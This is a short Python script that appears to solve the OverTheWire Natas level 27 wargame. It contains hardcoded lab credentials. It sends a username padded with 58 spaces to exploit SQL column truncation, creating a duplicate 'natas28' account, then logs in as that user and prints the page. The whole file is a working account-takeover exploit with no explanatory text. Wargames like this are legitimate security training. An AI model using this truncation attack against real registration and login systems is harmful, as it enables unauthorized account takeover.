#!/usr/bin/env python

import requests
import re
import urllib
import base64
from string import *
from time import *

characters = lowercase + uppercase + digits
#print characters

username = 'natas27'
password = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'


url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()

#response = session.get(url, auth = (username, password) )

response = session.post(url, data = \
				 {"username":"natas28" + " "*58 + "anything", 
				 "password":"blah"},
				  auth = (username, password) )


response = session.post(url, data = \
				 {"username":"natas28", 
				 "password":"blah"},
				  auth = (username, password) )


print response.text

